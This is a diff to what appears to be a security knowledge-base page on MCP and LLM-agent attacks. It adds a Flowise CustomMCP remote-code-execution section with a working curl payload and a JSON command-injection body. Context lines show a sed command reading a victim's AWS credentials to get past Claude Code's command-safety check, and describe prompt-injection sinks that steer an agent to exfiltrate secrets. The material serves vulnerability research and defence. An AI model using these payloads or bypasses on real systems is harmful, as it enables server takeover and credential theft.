@@ -184,7 +184,52 @@ echo 1 | sed 'r/Users/victim/.aws/credentials'
 - The same bypass reads sensitive files (`~/.aws/credentials`, SSH keys, etc.) and the agent dutifully summarizes or exfiltrates them via later tool calls (WebFetch, MCP resources, etc.).
 - An attacker only needs a prompt-injection sink: a poisoned README, web content fetched through `WebFetch`, or a malicious HTTP-based MCP server can instruct the model to invoke the “legitimate” sed command under the guise of log formatting or bulk editing.
 
+
+### Flowise MCP Workflow RCE (CVE-2025-59528 & CVE-2025-8943)
+
+Flowise embeds MCP tooling inside its low-code LLM orchestrator, but its **CustomMCP** node trusts user-supplied JavaScript/command definitions that are later executed on the Flowise server. Two separate code paths trigger remote command execution:
+
+- `mcpServerConfig` strings are parsed by `convertToValidJSONString()` using `Function('return ' + input)()` with no sandboxing, so any `process.mainModule.require('child_process')` payload executes immediately (CVE-2025-59528 / GHSA-3gcm-f6qx-ff7p). The vulnerable parser is reachable via the unauthenticated (in default installs) endpoint `/api/v1/node-load-method/customMCP`.
+- Even when JSON is supplied instead of a string, Flowise simply forwards the attacker-controlled `command`/`args` into the helper that launches local MCP binaries. Without RBAC or default credentials, the server happily runs arbitrary binaries (CVE-2025-8943 / GHSA-2vv2-3x8x-4gv7).
+
+Metasploit now ships two HTTP exploit modules (`multi/http/flowise_custommcp_rce` and `multi/http/flowise_js_rce`) that automate both paths, optionally authenticating with Flowise API credentials before staging payloads for LLM infrastructure takeover.
+
+Typical exploitation is a single HTTP request. The JavaScript injection vector can be demonstrated with the same cURL payload Rapid7 weaponised:
+
+```bash
+curl -X POST http://flowise.local:3000/api/v1/node-load-method/customMCP \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer <API_TOKEN>" \
+  -d '{
+    "loadMethod": "listActions",
+    "inputs": {
+      "mcpServerConfig": "({trigger:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"sh -c \\\"id>/tmp/pwn\\\"\");return 1;})()})"
+    }
+  }'
+```
+
+Because the payload is executed inside Node.js, functions such as `process.env`, `require('fs')`, or `globalThis.fetch` are instantly available, so it is trivial to dump stored LLM API keys or pivot deeper into the internal network.
+
+The command-template variant exercised by JFrog (CVE-2025-8943) does not even need to abuse JavaScript. Any unauthenticated user can force Flowise to spawn an OS command:
+
+```json
+{
+  "inputs": {
+    "mcpServerConfig": {
+      "command": "touch",
+      "args": ["/tmp/yofitofi"]
+    }
+  },
+  "loadMethod": "listActions"
+}
+```
+
 ## References
+- [CVE-2025-54136 – MCPoison Cursor IDE persistent RCE](https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/)
+- [Metasploit Wrap-Up 11/28/2025 – new Flowise custom MCP & JS injection exploits](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-11-28-2025)
+- [GHSA-3gcm-f6qx-ff7p / CVE-2025-59528 – Flowise CustomMCP JavaScript code injection](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)
+- [GHSA-2vv2-3x8x-4gv7 / CVE-2025-8943 – Flowise custom MCP command execution](https://github.com/advisories/GHSA-2vv2-3x8x-4gv7)
+- [JFrog – Flowise OS command remote code execution (JFSA-2025-001380578)](https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578)
 - [CVE-2025-54136 – MCPoison Cursor IDE persistent RCE](https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/)
 - [An Evening with Claude (Code): sed-Based Command Safety Bypass in Claude Code](https://specterops.io/blog/2025/11/21/an-evening-with-claude-code/)
 
